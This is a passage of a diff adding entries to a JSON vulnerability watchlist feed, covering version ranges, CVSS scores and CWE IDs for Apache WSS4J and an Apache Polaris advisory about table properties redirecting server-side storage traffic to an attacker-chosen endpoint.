+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "3.0.0",
+              "lessThan": "3.0.6",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "2.4.4",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache wss4j",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00307,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-190"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-97395",
+      "description": "Apache Polaris allows an authenticated principal with permission to create or update Iceberg table properties to set FileIO client settings such as s3.endpoint in table metadata.\n\n\nIn versions < 1.8.0, when Polaris performs server-side Iceberg operations, including commits and purges, it may use those settings to construct its (server-side) FileIO client. If the catalog storage configuration does not override the endpoint, Polaris can send storage requests to a host chosen by the table writer, using credentials scoped to the operation.\n\n\n\n\nThis can redirect server-side storage traffic and expose request authentication material to the chosen endpoint. Deployments are affected when table writers are not trusted to configure server-side storage endpoints.",
+      "cvss_score": 8.1,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache polaris",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "1.8.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache polaris",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00193,
+      "nvd": {
+        "cvss_v3_score": 8.1,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-862"
         ],
         "cpe_count": 0,
         "reference_count": 2
